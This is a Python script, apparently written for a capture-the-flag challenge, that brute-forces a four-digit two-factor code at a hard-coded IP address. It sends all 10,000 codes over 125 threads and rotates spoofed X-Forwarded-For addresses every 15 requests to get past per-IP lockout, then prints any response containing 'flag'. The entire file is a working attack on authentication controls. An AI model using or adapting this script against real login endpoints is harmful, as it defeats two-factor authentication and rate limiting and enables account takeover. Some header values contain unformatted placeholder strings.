import requests
import time
import concurrent.futures

# Globals
target = "94.237.49.212:59221"
CONNECTIONS = 125
lockout = 0
# Third + fourth octet
o3 = 13
o4 = 37

# Headers
headers = {
        'Host': '{target}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': '{target}}/auth/verify-2fa',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '13',
        'Origin': '{target}',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
}

# Build requests
def send_request(i, o3, o4):
    # Make data four digits
    data = {'2fa-code': f'{i:04}'}
    # Bypass IP checks
    headers['X-Forwarded-For'] = f'192.168.{o3}.{o4}'
    try:
        response = requests.post(f'http://{target}/auth/verify-2fa', headers=headers, data=data, verify=False)
        if 'Invalid 2FA Code' in response.text:
            # print(f"Request {i} - Status code: {response.status_code} for PIN: {i:04} and IP: 192.168.{o3}.{o4}")
            return
        elif 'flag' in response.text:
            print(f"Request {i} - Flag: {response.text}")
            exit()
    except Exception as e:
        print(f"Request {i} - Exception: {e}")

# Request faster
with concurrent.futures.ThreadPoolExecutor(max_workers=CONNECTIONS) as executor:
    for i in range(10000):
        executor.submit(send_request, i, o3, o4)
        time.sleep(0)
        if lockout == 15:
            lockout = 0
            o4 += 1
        if o4 == 254:
            o4 = 1
            o3 += 1
        lockout += 1
